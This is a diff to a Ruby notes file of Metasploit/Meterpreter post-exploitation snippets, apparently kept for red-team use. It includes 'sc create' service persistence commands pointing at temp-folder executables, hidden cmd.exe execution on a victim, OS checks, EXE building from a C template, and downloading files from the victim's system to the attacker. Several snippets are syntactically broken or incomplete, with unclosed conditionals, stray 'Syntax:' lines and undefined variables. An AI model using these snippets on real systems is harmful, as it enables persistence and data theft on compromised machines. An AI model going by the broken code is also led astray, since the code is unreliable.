@@ -6,8 +6,24 @@
 
 
 
-# colors in prints
+#
+# colors in prints (milton@barra)
+#
 print_line("%red" + "[SSA-red_team]")
+
+
+
+#
+# print time (hours)
+#
+print_line("Hello from a metasploit session at #{Time.now}")
+
+
+
+#
+# use backslash to escape double quotes or special caracters
+#
+print_status("sc create #{sname} bin= \"%tmp%\\fg.exe\"")
 
 
 #
@@ -41,9 +57,18 @@ read_file("/proc/scsi/scsi")
 
 
 
+#
+# Execute command and display results
+#
+print_status("Executing command: ifconfig wlan0")
+command_output = cmd_exec("ifconfig wlan0")
+print_line("CONFIGS: #{command_output}")
+
+
+
 
 #
-# C template
+# BUILD C template
 #
 exeTEMPLATE = %{#include <stdio.h>
 #include <windows.h>
@@ -68,27 +93,52 @@ int main(){
 }
 }
 
-# write C template to  file
+# write C template to a file
 file_temp = File.new("temp.c", "w")
 file_temp.write(exeTEMPLATE)
 file_temp.close
 
 
 
+#
+# write to a local file
+#
+File = file.open("/root/test", "w")
+File.write("sc create #{sname} binpath= \"%tmp%\\t.exe\" start= auto") 
+File.close
 
 
-#determine if MinGW has been installed, support new and old MinGW system paths
+
+#
+# write file with multiple lines
+#
+File.open("/root/hello.sh", "w") {|f| f.write("#!/bin/sh\necho 'hello iam 1º line'\necho 'hello iam the 2º line'\nsleep 3\nexit") }
+
+
+
+#
+# determine if MinGW has been installed, support new and old MinGW system paths
+#
 mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
 if mingw == false
     print_error("[*] You must have MinGW-32 installed in order to compile EXEs!!")
-    exit
+    return nil
 end
+
+
+
+#
+# check for proper operative system
+#
+if session.platform == 'windows'
+if not session.platform.include?("linux")
 
 
 
 #
 # check for proper operative system (windows-not-wine)
 #
+oscheck = client.fs.file.expand_path("%OS%")
 if not oscheck == "Windows_NT"
   print_error("[ ABORT ]: This module only works againts windows systems")
   return nil
@@ -96,7 +146,9 @@ end
 
 
 
+#
 # check for proper operative system (windows 10)
+#
 if not sysinfo['OS'] =~ /Windows 10/
   print_error("[ ABORT ]: This module only works againt windows 10 systems")
   return nil
@@ -104,52 +156,54 @@ end
 
 
 
-# write to local file
-File = file.open("/root/test", "w")
-File.write("sc create #{sname} binpath= \"%tmp%\\t.exe\" start= auto") 
-File.close
+#
+# determine taget distro
+#
+target_info = cmd_exec('uname -ms')
+if target_info =~ /linux/
+  print_status("Platform: Linux")
+end
 
 
-
-
-# use backslash to escape double quotes or special caracters
-("sc create #{sname} bin= \"%tmp%\\fg.exe\"") 
-
-
+ 
+#
 # random filename (8 caracters)
+#
 rand = Rex::Text.rand_text_alpha(8)+".log"
 print_good("#{rand} file created")
 
 
 
+#
 # check if file exists
+#
 print_warning("check if file exists")
 path="%systemroot%\\system32\\ola.txt"
 if session.fs.file.exist?(path)
-print_good("file found ..")
+  print_good("file found ..")
+end
 
 
+
+#
+# make a directory named "oldman" in c drive.
+#
+Syntax: client.fs.dir.mkdir("c:\\oldman")
+
+
+
+#
 # check if directory exists
+#
 get_path = "C:\\windows"
-  if session.fs.directory.exist?(get_path)
+  if session.fs.dir.exist?(get_path)
     print_good('Vuln path exists')
     return Exploit::CheckCode::Appears
   else
-    vprint_error("#{get_path} doesn't exist on target")
+    print_error("#{get_path} doesn't exist on target")
     return Exploit::CheckCode::Safe
 end
 
-
-# Ruby function to check directory existence
-if(File.directory?('arjun')) 
-  puts 'Directory exists'
-else
-  puts 'Directory not found'
-end
-
-
-# make a directory named "oldman" in c drive.
-Syntax: client.fs.dir.mkdir("c:\\oldman")
 
 
 
@@ -234,6 +288,24 @@ def check
         break
       end
 end
+
+
+
+#
+# Download file from victims system
+# This will download dum.txt from victims system and will save it to attackers root directory
+#
+client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
+
+
+
+# Open a file in read mode and copy the content to some variable
+# Comment: This will copy all the data inside dum.txt and store it in vtemp variable
+file1 = client.fs.file.new("%temp%\\dum.txt")
+              vtemp = ""
+              until file1.eof?
+              vtemp << file_object.read
+
 
 
 
@@ -403,20 +475,6 @@ r = session.sys.process.execute("cmd.exe /c query user", nil, {'Hidden' => true,
 # o display para um log file e fazer o download dele
 #
 r = session.sys.process.execute("cmd.exe /c netsh interface show interface > %temp%\\dum.txt", nil, {'Hidden' => true, 'Channelized' => true})
-
-# Download file from victims system
-Syntax: client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
-Output: ["c:\\temp\\dum.txt"]
-Comment: This will download dum.txt from victims system and will save it to attackers root directory
-
-# Open a file in read mode and copy the content to some variable
-# Comment: This will copy all the data inside dum.txt and store it in vtemp variable
-Syntax: file1 = client.fs.file.new("%temp%\\dum.txt")
-              vtemp = ""
-              until file1.eof?
-              vtemp << file_object.read
-
-
 
 
 #
